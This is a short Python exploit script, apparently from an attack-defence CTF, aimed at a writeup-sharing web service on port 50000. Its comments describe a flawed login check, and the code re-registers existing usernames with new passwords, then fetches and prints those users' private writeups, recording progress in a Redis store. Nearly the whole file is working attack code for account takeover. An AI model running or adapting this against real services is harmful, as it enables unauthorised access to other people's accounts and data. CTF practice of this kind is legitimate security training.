#!/usr/bin/env python3

# in service we can find this SQL query for check user existence:
# SELECT (login) FROM users WHERE login = ? AND password = ?
#
# this is very bad check and vulnerability
# we can register a new user with other password and get him writeups as plaintext 

from libsplo import *
import sys
import re
import random
import string
import binascii


st = DictStorage(RedisConnector("wroteup_xor", "redis://redis.kappactf.ru"))
ip = sys.argv[1]

username = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(10)])
password = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(10)])

sess = requests.Session()
sess.post(f"http://{ip}:50000/register", data={
        "login" : username,
        "password" : password,
})

resp = sess.get(f"http://{ip}:50000/main").text

data = re.findall(r'text-gray-dark">@(.*)</strong>\s+(.*)\s+</p>', resp)
passed = set(st.keys())

real = []
for (user, ctf) in data:
	if user not in passed:
		real.append((user, ctf))


for (user, ctf) in real:
	password = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(10)])
	sess.post(f"http://{ip}:50000/register", data={
		"login" : user,
		"password" : password,
	})
	resp = sess.get(f"http://{ip}:50000/show?ctf={ctf}").text
	print(resp, flush=True)
